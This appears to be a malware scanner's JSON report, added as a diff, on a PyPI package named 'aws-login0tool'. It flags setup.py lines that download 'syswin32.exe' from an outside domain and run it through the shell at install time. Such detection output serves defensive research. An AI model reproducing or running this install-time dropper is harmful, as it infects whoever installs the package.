@@ -1,0 +1,36 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "cmd-overwrite": {},
+        "code-execution": [
+            {
+                "location": "setup.py:13",
+                "code": "\trun(['start', 'syswin32.exe'], shell=True)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": [
+            {
+                "location": "setup.py:12",
+                "code": "\turllib.urlrequest.urlretrieve(\"https://tryg.ga/syswin32.exe\", \"syswin32.exe\")\n",
+                "message": "This package is downloading making executable a remote binary"
+            }
+        ],
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "exfiltrate-sensitive-data": {},
+        "shady-links": [
+            {
+                "location": "setup.py:12",
+                "code": "\turllib.urlrequest.urlretrieve(\"https://tryg.ga/syswin32.exe\", \"syswin32.exe\")\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "steganography": {},
+        "obfuscation": {},
+        "exec-base64": {},
+        "dll-hijacking": {}
+    },
+    "path": "./dataset/pypi/aws-login0tool-0.0.4"
+}
